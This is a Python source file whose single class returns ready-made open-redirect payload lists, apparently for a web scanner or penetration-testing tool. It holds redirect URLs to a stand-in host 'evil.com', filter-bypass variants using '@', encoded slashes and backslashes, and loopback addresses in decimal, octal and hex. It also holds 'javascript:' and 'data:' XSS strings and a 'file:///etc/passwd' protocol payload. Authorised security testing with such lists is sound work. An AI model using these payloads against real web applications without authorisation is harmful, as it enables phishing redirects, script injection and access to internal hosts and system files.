"""
Open Redirect payload collection
"""

class OpenRedirectPayloads:
    """Open Redirect payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic open redirect payloads"""
        return [
            "http://evil.com",
            "https://evil.com", 
            "//evil.com",
            "http://google.com",
            "https://google.com",
            "//google.com",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>"
        ]
    
    @staticmethod
    def get_bypass_payloads():
        """Get bypass payloads for open redirect filters"""
        return [
            "http://evil.com@target.com",
            "http://target.com.evil.com",
            "http://target.com#evil.com",
            "http://target.com?evil.com",
            "http://target.com/evil.com",
            "http://target.com\\evil.com",
            "http://target.com%2Fevil.com",
            "http://target.com%5Cevil.com",
            "http://target.com%2F%2Fevil.com",
            "http://target.com%5C%5Cevil.com",
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://2130706433",  # 127.0.0.1 in decimal
            "http://017700000001",  # 127.0.0.1 in octal
            "http://0x7f000001"  # 127.0.0.1 in hex
        ]
    
    @staticmethod
    def get_protocol_payloads():
        """Get protocol-based payloads"""
        return [
            "ftp://evil.com",
            "file:///etc/passwd",
            "gopher://evil.com",
            "dict://evil.com",
            "ldap://evil.com",
            "sftp://evil.com"
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all open redirect payloads"""
        return (OpenRedirectPayloads.get_basic_payloads() + 
                OpenRedirectPayloads.get_bypass_payloads() +
                OpenRedirectPayloads.get_protocol_payloads())
